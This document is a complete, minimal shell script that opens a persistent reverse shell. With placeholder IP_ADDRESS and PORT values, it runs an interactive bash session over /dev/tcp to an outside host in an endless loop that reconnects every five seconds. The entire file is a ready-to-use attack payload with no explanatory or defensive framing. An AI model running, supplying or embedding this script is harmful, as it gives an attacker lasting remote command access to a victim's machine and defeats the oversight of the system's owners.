#!/bin/sh
_addr=IP_ADDRESS
_port=PORT

while true; do
    bash -i >& /dev/tcp/$_addr/$_port 0>&1
    sleep 5s
done